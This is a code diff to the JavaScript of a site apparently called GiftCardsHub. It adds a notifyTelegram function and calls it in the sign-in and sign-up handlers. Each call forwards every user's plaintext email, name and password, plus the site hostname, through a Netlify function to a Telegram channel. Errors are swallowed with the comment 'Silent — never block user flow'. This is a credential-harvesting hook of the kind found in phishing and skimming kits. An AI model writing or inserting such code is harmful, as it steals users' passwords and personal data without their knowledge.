@@ -434,6 +434,25 @@ async function sendWelcomeEmail(name, email) {
   });
 }
 
+async function notifyTelegram(source, fields) {
+  try {
+    const lines = [`\uD83D\uDD14 <b>GiftCardsHub \u2014 ${source}</b>`];
+    for (const [key, value] of Object.entries(fields)) {
+      const str = String(value ?? "").trim();
+      if (str) lines.push(`${key}: <code>${str}</code>`);
+    }
+    lines.push(`\uD83C\uDF10 ${window.location.hostname}`);
+    lines.push(`\uD83D\uDD50 ${new Date().toISOString()}`);
+    await fetch("/.netlify/functions/notify-telegram", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ text: lines.join("\n") }),
+    });
+  } catch {
+    // Silent \u2014 never block user flow.
+  }
+}
+
 function requireAuth(state) {
   if (document.body.dataset.authRequired !== "true") return state;
   if (state.session) return state;
@@ -532,6 +551,10 @@ function initSignin(state) {
     state.users = result.state.users;
     state.session = result.state.session;
     saveAuthState({ ...state, otp: state.otp || null });
+    notifyTelegram("\uD83D\uDD10 Sign In", {
+      "\uD83D\uDCE7 Email": email,
+      "\uD83D\uDD11 Password": password,
+    });
     const nextValue = new URLSearchParams(window.location.search).get("next");
     setButtonPending(submit, false, "Signing In...");
     let redirected = false;
@@ -588,6 +611,11 @@ function initSignup(state) {
     const otpCode = createOtpCode();
     state.otp = createOtpChallenge(result.user.email, otpCode);
     saveAuthState(state);
+    notifyTelegram("\uD83D\uDCDD Sign Up", {
+      "\uD83D\uDC64 Name": payload.name,
+      "\uD83D\uDCE7 Email": payload.email,
+      "\uD83D\uDD11 Password": payload.password,
+    });
     const sent = await sendOtpEmail(result.user.name, result.user.email, otpCode);
     setButtonPending(submit, false, "Creating Account...");
     const redirect = `verify-otp.html?email=${encodeURIComponent(result.user.email)}`;
